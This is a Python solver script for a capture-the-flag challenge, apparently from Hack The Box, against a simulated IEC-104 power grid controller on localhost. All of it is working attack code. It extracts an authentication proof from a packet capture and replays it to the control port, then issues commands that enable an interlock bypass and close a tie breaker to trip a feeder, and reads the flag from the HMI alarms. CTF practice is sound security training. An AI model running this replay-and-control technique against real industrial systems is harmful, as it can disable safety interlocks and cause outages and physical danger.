#!/usr/bin/env python3
import json
import re
import socket
import struct
import time
from pathlib import Path
from urllib.request import urlopen

try:
    import c104
except ModuleNotFoundError as error:
    raise SystemExit("missing dependency: run `python3 -m pip install -r requirements.txt` from the solver directory") from error


HOST = "127.0.0.1"
IEC104_PORT = 2404
HMI_PORT = 18081
CAPTURE_PATH = Path(__file__).resolve().parents[1] / "release" / "backup.pcap"

COMMON_ADDR = 17
COT_ACTIVATION = 6
TYPE_C_TS_NA_1 = 104
IOA_MAINT_HANDOFF = 0x041104
IOA_INTERLOCK_BYPASS = 1101
IOA_TIE_BREAKER_CLOSE = 1201


def pack_ioa(ioa: int) -> bytes:
    return bytes((ioa & 0xFF, (ioa >> 8) & 0xFF, (ioa >> 16) & 0xFF))


def unpack_ioa(raw: bytes) -> int:
    return raw[0] | (raw[1] << 8) | (raw[2] << 16)


def build_asdu(type_id: int, cot: int, objects: bytes, common_addr: int = COMMON_ADDR, vsq: int = 1) -> bytes:
    return bytes((type_id, vsq)) + struct.pack("<HH", cot, common_addr) + objects


def build_i_frame(send_seq: int, recv_seq: int, asdu: bytes) -> bytes:
    control = struct.pack("<HH", send_seq << 1, recv_seq << 1)
    payload = control + asdu
    return b"\x68" + bytes((len(payload),)) + payload


def build_u_frame(control: bytes) -> bytes:
    return b"\x68\x04" + control


def maintenance_handoff_asdu(proof: bytes) -> bytes:
    return build_asdu(TYPE_C_TS_NA_1, COT_ACTIVATION, pack_ioa(IOA_MAINT_HANDOFF) + proof)


def http_json(path: str) -> dict:
    with urlopen(f"http://{HOST}:{HMI_PORT}{path}", timeout=5) as response:
        return json.loads(response.read().decode("utf-8"))


def read_capture(path: Path) -> bytes:
    if not path.exists():
        raise RuntimeError(f"release capture not found: {path}")
    return path.read_bytes()


def iter_iec104_frames(data: bytes):
    offset = 0
    while True:
        start = data.find(b"\x68", offset)
        if start < 0 or start + 2 > len(data):
            return
        length = data[start + 1]
        end = start + 2 + length
        if length >= 4 and end <= len(data):
            yield data[start:end]
        offset = start + 1


def extract_handoff_proof(pcap: bytes) -> bytes:
    for frame in iter_iec104_frames(pcap):
        control = frame[2:6]
        if control[0] & 0x01:
            continue
        asdu = frame[6:]
        if len(asdu) < 17 or asdu[0] != TYPE_C_TS_NA_1:
            continue
        cot = struct.unpack("<H", asdu[2:4])[0] & 0x3F
        common_addr = struct.unpack("<H", asdu[4:6])[0]
        ioa = unpack_ioa(asdu[6:9])
        if cot == COT_ACTIVATION and common_addr == COMMON_ADDR and ioa == IOA_MAINT_HANDOFF:
            return asdu[9:17]
    raise RuntimeError("no IEC-104 handoff proof found in capture")


def recv_iec104_frame(sock: socket.socket) -> bytes:
    start = sock.recv(1)
    while start and start != b"\x68":
        start = sock.recv(1)
    if not start:
        raise RuntimeError("connection closed")
    length = sock.recv(1)[0]
    data = sock.recv(length)
    while len(data) < length:
        data += sock.recv(length - len(data))
    return start + bytes((length,)) + data


def inject_handoff_proof(host: str, port: int, proof: bytes) -> None:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(build_u_frame(b"\x07\x00\x00\x00"))
        response = recv_iec104_frame(sock)
        if response != build_u_frame(b"\x0b\x00\x00\x00"):
            raise RuntimeError(f"unexpected STARTDT response: {response.hex()}")
        sock.sendall(build_i_frame(0, 0, maintenance_handoff_asdu(proof)))
        time.sleep(0.2)


def wait_for_connection(connection: c104.Connection, timeout: float = 5.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if connection.is_connected:
            return
        time.sleep(0.1)
    raise RuntimeError("c104 client did not connect")


def build_command_client(host: str, port: int) -> tuple[c104.Client, c104.Point, c104.Point]:
    client = c104.Client(tick_rate_ms=100, command_timeout_ms=5000)
    connection = client.add_connection(host, port, init=c104.Init.ALL)
    if connection is None:
        raise RuntimeError("failed to create c104 connection")
    station = connection.add_station(COMMON_ADDR)
    if station is None:
        raise RuntimeError("failed to create c104 station")
    bypass = station.add_point(
        io_address=IOA_INTERLOCK_BYPASS,
        type=c104.Type.C_SC_NA_1,
        command_mode=c104.CommandMode.SELECT_AND_EXECUTE,
    )
    tie_breaker = station.add_point(
        io_address=IOA_TIE_BREAKER_CLOSE,
        type=c104.Type.C_SC_NA_1,
        command_mode=c104.CommandMode.SELECT_AND_EXECUTE,
    )
    if bypass is None or tie_breaker is None:
        raise RuntimeError("failed to create c104 command points")
    client.start()
    wait_for_connection(connection)
    return client, bypass, tie_breaker


def select_execute(point: c104.Point, state: bool) -> None:
    point.value = state
    if not point.transmit(cause=c104.Cot.ACTIVATION):
        raise RuntimeError(f"c104 command IOA {point.io_address} was rejected")


def main() -> None:
    print("[*] Reading release maintenance handoff capture")
    pcap = read_capture(CAPTURE_PATH)
    proof = extract_handoff_proof(pcap)
    print(f"[+] Replayed proof extracted from PCAP: {proof.hex()}")

    print("[*] Replaying handoff proof")
    inject_handoff_proof(HOST, IEC104_PORT, proof)

    print("[*] Operating IEC-104 controls with c104")
    client, bypass, tie_breaker = build_command_client(HOST, IEC104_PORT)
    try:
        select_execute(bypass, True)
        select_execute(tie_breaker, True)
    finally:
        client.stop()

    print("[*] Waiting for feeder trip alarm")
    deadline = time.time() + 10
    while time.time() < deadline:
        alarms = http_json("/alarms")["alarms"]
        for alarm in alarms:
            match = re.search(r"HTB\{[^}]+\}", alarm["message"])
            if match:
                print(f"[+] {match.group(0)}")
                return
        time.sleep(0.5)
    raise RuntimeError("token alarm did not appear")


if __name__ == "__main__":
    main()
